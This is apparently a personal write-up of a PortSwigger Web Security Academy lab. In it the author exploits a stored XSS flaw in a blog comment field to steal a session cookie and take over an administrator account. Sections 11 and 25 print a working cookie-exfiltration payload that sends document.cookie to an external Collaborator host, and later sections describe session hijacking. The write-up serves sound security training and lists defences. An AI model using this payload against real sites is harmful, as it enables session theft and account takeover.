# PortSwigger Web Security Academy -- Exploiting XSS to Steal Cookies

## Lab

**Lab:** Exploiting cross-site scripting to steal cookies\
**Platform:** PortSwigger Web Security Academy\
**Difficulty:** Apprentice\
**Method:** Stored XSS → cookie exfiltration → session hijacking

> **Note:** This documentation is based on my actual steps, including
> mistakes and troubleshooting.\
> The session cookie obtained during the lab is intentionally **not**
> included here.

------------------------------------------------------------------------

# 1. Objective

The objective of this lab was to exploit a stored cross-site scripting
(XSS) vulnerability in a blog comment field to steal the victim's
session cookie.

The overall attack chain was:

``` text
Find stored XSS
      ↓
Confirm JavaScript execution
      ↓
Create Burp Collaborator payload
      ↓
Inject cookie-stealing JavaScript
      ↓
Victim loads the malicious comment
      ↓
Victim's document.cookie is sent to Collaborator
      ↓
Obtain victim's session cookie
      ↓
Replace my browser's session cookie
      ↓
Visit /my-account
      ↓
Logged in as administrator
      ↓
Lab Solved
```

------------------------------------------------------------------------

# 2. Tools Used

-   Burp Suite Professional
-   Burp Proxy
-   Burp Repeater
-   Burp Collaborator
-   Chrome
-   FoxyProxy browser extension
-   PortSwigger Web Security Academy lab

Burp Proxy listener used:

``` text
127.0.0.1:8080
```

------------------------------------------------------------------------

# 3. Initial Setup

I was using Burp Suite Professional on Windows.

The Burp proxy listener was active on:

``` text
127.0.0.1:8080
```

I configured FoxyProxy in Chrome so that browser traffic would pass
through Burp.

### FoxyProxy configuration

``` text
Title: Burp Suite
Proxy Type: HTTP
Hostname: 127.0.0.1
Port: 8080
```

The important part was selecting/enabling the **Burp Suite** proxy
profile in the FoxyProxy popup.

------------------------------------------------------------------------

# 4. Mistake: Burp HTTP History Was Empty

At first, Burp Proxy → HTTP history was not showing my Chrome requests.

I initially thought something was wrong with Burp.

### What was actually wrong

The FoxyProxy profile existed, but it was **disabled**.

I had not selected the **Burp Suite** profile from the FoxyProxy popup.

### Fix

I opened FoxyProxy and selected:

``` text
Burp Suite
```

After enabling it, Chrome traffic started appearing in:

``` text
Burp Suite
→ Proxy
→ HTTP history
```

I could then see requests such as:

``` text
GET /
```

from the lab.

### Lesson

Creating a proxy profile is not enough. The profile must actually be
enabled/selected for Chrome traffic to go through Burp.

------------------------------------------------------------------------

# 5. Confirming Browser → Burp → Lab

After enabling FoxyProxy, the traffic flow was:

``` text
Chrome
   ↓
FoxyProxy
   ↓
127.0.0.1:8080
   ↓
Burp Suite
   ↓
PortSwigger Lab
```

This confirmed that Burp was correctly intercepting my browser traffic.

------------------------------------------------------------------------

# 6. Exploring the Lab

I opened the vulnerable blog post:

``` text
/post?postId=7
```

I inspected the page and found the comment functionality.

The next step was to test whether the comment field was vulnerable to
stored XSS.

------------------------------------------------------------------------

# 7. Testing for Stored XSS

I submitted the following comment:

``` html
<script>alert(1)</script>
```

After submitting the comment, I returned to the blog post.

A browser alert appeared showing:

``` text
1
```

This confirmed that JavaScript supplied through the comment was being
executed.

Therefore, the comment was a **stored XSS injection point**.

------------------------------------------------------------------------

# 8. Burp HTTP History During the XSS Test

Burp HTTP history showed requests associated with the comment
submission, including:

``` text
GET /post?postId=7
POST /post/comment
GET /post/comment/confirmation?postId=...
GET /post?postId=7
```

The important request was:

``` text
POST /post/comment
```

This was the request that submitted the malicious comment.

The subsequent page load caused the stored JavaScript to execute.

------------------------------------------------------------------------

# 9. Mistake: Trying to Change the Session Cookie in Repeater

Before completing the actual XSS cookie theft, I experimented with Burp
Repeater.

I manually changed the request cookie and sent a request to:

``` text
/my-account
```

For example:

``` http
GET /my-account HTTP/2
Cookie: session=<some-session-value>
```

The server responded with:

``` text
HTTP/2 302 Found
Location: /login
```

This showed that the session value I was using was not an accepted
authenticated session.

I tried another session value and got the same type of result.

### Lesson

I initially tried to manually manipulate session cookies before actually
obtaining the victim's session through the XSS.

The correct approach was to:

1.  Exploit the stored XSS.
2.  Send the victim's cookie to a server I control.
3.  Obtain the victim's actual session cookie.
4.  Put that cookie into the browser.
5.  Access the account page.

------------------------------------------------------------------------

# 10. Burp Collaborator

For the cookie exfiltration step, I used Burp Collaborator.

I generated a fresh Collaborator payload.

The payload domain used during this lab was:

``` text
0deg3kbzib420gibsuvchpd13s9jxcl1.oastify.com
```

Burp Collaborator is useful here because the injected JavaScript can
make an HTTP request to the unique Collaborator domain.

------------------------------------------------------------------------

# 11. Replacing the Alert Payload

The original XSS payload was:

``` html
<script>alert(1)</script>
```

This only proved JavaScript execution.

I then replaced it with a payload designed to send `document.cookie` to
my Burp Collaborator domain.

The payload used was:

``` html
<script>
fetch('https://0deg3kbzib420gibsuvchpd13s9jxcl1.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

### What the payload does

``` javascript
document.cookie
```

reads cookies accessible to JavaScript.

Then:

``` javascript
fetch(...)
```

sends those cookies to the Burp Collaborator domain.

The important part was:

``` javascript
body: document.cookie
```

------------------------------------------------------------------------

# 12. Submitting the Cookie-Stealing XSS

I submitted the malicious JavaScript as a new blog comment.

The stored XSS was then available on the blog post.

When the victim loaded the page, the JavaScript executed in the victim's
browser.

The attack became:

``` text
Victim opens blog post
        ↓
Stored JavaScript executes
        ↓
document.cookie is read
        ↓
fetch() sends cookie to Collaborator
        ↓
Burp Collaborator receives HTTP interaction
```

------------------------------------------------------------------------

# 13. Polling Burp Collaborator

I opened:

``` text
Burp Suite
→ Collaborator
```

Then I used:

``` text
Poll now
```

to check for incoming interactions.

A new HTTP interaction appeared.

I opened the interaction and inspected the request.

The request body contained the stolen cookie information.

It was similar to:

``` text
secret=...; session=...
```

The important value for the final step was:

``` text
session=...
```

I copied the victim's **session value**.

### Important

The actual session token should not be stored in a public GitHub README.

------------------------------------------------------------------------

# 14. Understanding the Cookie

The stolen cookie contained a session identifier.

The important distinction was:

``` text
secret=...
session=...
```

For impersonating the victim, I needed:

``` text
session=...
```

I did not need to expose or document the actual secret/session values.

------------------------------------------------------------------------

# 15. Testing the Stolen Session in Repeater

I could use the stolen session in a request such as:

``` http
GET /my-account HTTP/2
Cookie: session=<stolen-session>
```

This demonstrated that the stolen session was valid.

However, this did **not** immediately mark the lab as solved.

This was an important part of the troubleshooting process.

------------------------------------------------------------------------

# 16. Why Repeater Did Not Solve the Lab

Changing the cookie in Repeater only changed the cookie for that
particular HTTP request.

In other words:

``` text
Burp Repeater
    ↓
GET /my-account
Cookie: session=<victim-session>
```

proved that the stolen session worked, but it did not change the
browser's actual cookie state.

The lab's intended final step required using the stolen session in the
browser and then accessing the account.

------------------------------------------------------------------------

# 17. Final Step: Replace the Browser Cookie

I opened Chrome's developer tools and inspected the cookies for the
PortSwigger lab.

I found the:

``` text
session
```

cookie.

I replaced my current session cookie with the stolen victim session
value.

I did **not** need to change the `secret` cookie.

The important change was:

``` text
session = <victim-session>
```

------------------------------------------------------------------------

# 18. Visiting My Account

After replacing the browser cookie, I opened:

``` text
/my-account
```

The page showed:

``` text
Your username is: administrator
```

This confirmed that the browser was now authenticated using the victim's
administrator session.

------------------------------------------------------------------------

# 19. Lab Was Initially Showing "Not Solved"

At first, even after reaching the administrator account, the lab status
still showed:

``` text
LAB
Not solved
```

I refreshed the page and checked the account again.

The important thing I eventually discovered was that changing the cookie
in the **browser itself** through the developer tools triggered the
lab's completion condition.

The lab then changed to:

``` text
LAB
Solved
```

------------------------------------------------------------------------

# 20. Why the Final Browser Cookie Change Worked

The final successful flow was:

``` text
Stored XSS
    ↓
Steal victim cookie
    ↓
Obtain victim session
    ↓
Modify browser's session cookie
    ↓
Request /my-account from browser
    ↓
Server recognizes administrator session
    ↓
Lab detects successful exploitation
    ↓
Solved
```

This was different from only sending the request through Repeater.

------------------------------------------------------------------------

# 21. HTTPS "Not Secure" Warning

While using FoxyProxy and Burp, Chrome showed an HTTPS security warning
/ "Not secure" indication.

This happened because HTTPS traffic was being intercepted by Burp.

The traffic flow was:

``` text
Chrome
  ↓
FoxyProxy
  ↓
Burp Suite
  ↓
HTTPS Lab
```

Burp acts as an intercepting proxy for HTTPS connections and uses its
own local CA certificate.

If Chrome does not trust Burp's CA certificate, certificate/security
warnings can appear.

### Important distinction

FoxyProxy itself is not making the PortSwigger lab insecure.

FoxyProxy is simply routing the browser traffic through Burp.

For a proper Burp setup, Burp's CA certificate can be installed in the
browser so HTTPS interception is trusted.

------------------------------------------------------------------------

# 22. Mistakes I Made

## Mistake 1 -- FoxyProxy was disabled

I created the FoxyProxy profile but forgot to actually select it.

### Result

Burp HTTP history was empty.

### Correct approach

Enable the:

``` text
Burp Suite
```

profile in FoxyProxy.

------------------------------------------------------------------------

## Mistake 2 -- I tried changing random session cookies

I manually changed session cookies in Repeater before obtaining the
victim's real session.

### Result

The server returned:

``` text
302 Found
Location: /login
```

### Correct approach

First steal the actual victim session through the XSS.

------------------------------------------------------------------------

## Mistake 3 -- I assumed Repeater would solve the lab

I successfully used the stolen session in Repeater and could access the
administrator account.

However, the lab still showed:

``` text
Not solved
```

### Correct approach

Replace the session cookie in the actual browser and visit:

``` text
/my-account
```

------------------------------------------------------------------------

## Mistake 4 -- I initially used `alert(1)` only

The payload:

``` html
<script>alert(1)</script>
```

was useful because it confirmed XSS, but it did not steal anything.

### Correct approach

Once XSS was confirmed, replace the test payload with a
cookie-exfiltration payload.

------------------------------------------------------------------------

# 23. What I Learned

### Stored XSS

A stored XSS payload is saved by the application and executed whenever a
vulnerable page containing the payload is loaded.

### `document.cookie`

JavaScript can access cookies that are available to scripts.

Example:

``` javascript
document.cookie
```

### Session hijacking

If an attacker obtains a victim's session cookie, they may be able to
impersonate that victim.

### Burp Collaborator

Collaborator provides a unique external endpoint that can receive
requests generated by the vulnerable application or victim browser.

### Repeater vs Browser

Burp Repeater is excellent for testing individual HTTP requests.

However, changing a cookie in Repeater does not automatically change the
browser's stored cookie.

### Proxy configuration

Having FoxyProxy installed is not enough. The correct proxy profile must
be enabled.

------------------------------------------------------------------------

# 24. Final Exploit Chain

The complete exploit I performed was:

``` text
1. Configure Burp proxy
        ↓
2. Configure FoxyProxy
        ↓
3. Enable the Burp Suite FoxyProxy profile
        ↓
4. Verify Chrome traffic in Burp HTTP history
        ↓
5. Open vulnerable blog post
        ↓
6. Identify comment input
        ↓
7. Submit <script>alert(1)</script>
        ↓
8. Confirm stored XSS
        ↓
9. Generate Burp Collaborator payload
        ↓
10. Submit cookie-stealing JavaScript
        ↓
11. Victim loads the malicious comment
        ↓
12. Poll Burp Collaborator
        ↓
13. Obtain victim's session cookie
        ↓
14. Replace browser session cookie
        ↓
15. Open /my-account
        ↓
16. Username = administrator
        ↓
17. Lab = Solved
```

------------------------------------------------------------------------

# 25. Key Commands / Payloads Used

### XSS confirmation

``` html
<script>alert(1)</script>
```

### Cookie-stealing payload

``` html
<script>
fetch('https://0deg3kbzib420gibsuvchpd13s9jxcl1.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

### Proxy

``` text
127.0.0.1:8080
```

### Vulnerable post

``` text
/post?postId=7
```

### Account page

``` text
/my-account
```

------------------------------------------------------------------------

# 26. Final Result

✅ Stored XSS identified\
✅ JavaScript execution confirmed\
✅ Burp Collaborator configured\
✅ Victim cookie exfiltrated\
✅ Victim session obtained\
✅ Administrator session successfully used\
✅ `/my-account` accessed as administrator\
✅ PortSwigger lab solved

------------------------------------------------------------------------

# 27. Security Takeaway

This lab demonstrates why stored XSS can be much more serious than
simply displaying an alert.

A vulnerable comment field can potentially allow an attacker to execute
JavaScript in another user's browser. If session cookies are accessible
to JavaScript, the attacker may be able to steal the session and
impersonate the victim.

Defensive measures include:

-   Proper output encoding
-   Context-aware input handling
-   Strong Content Security Policy (CSP)
-   Using `HttpOnly` for session cookies
-   Using `Secure` and appropriate `SameSite` cookie settings
-   Avoiding unsafe HTML rendering
-   Validating and sanitizing user-generated content where appropriate

------------------------------------------------------------------------

# 28. Personal Notes

### The biggest troubleshooting lesson

When Burp isn't showing browser traffic, check the proxy configuration
**before assuming Burp is broken**.

In my case:

``` text
FoxyProxy profile existed
        ↓
But it was disabled
        ↓
No browser traffic in Burp
        ↓
Enabled "Burp Suite"
        ↓
Traffic appeared
```

### The biggest XSS lesson

Finding XSS is only the beginning.

The lab helped me understand the complete chain:

``` text
XSS
→ JavaScript execution
→ Cookie access
→ Cookie exfiltration
→ Session hijacking
→ Account takeover
```

------------------------------------------------------------------------
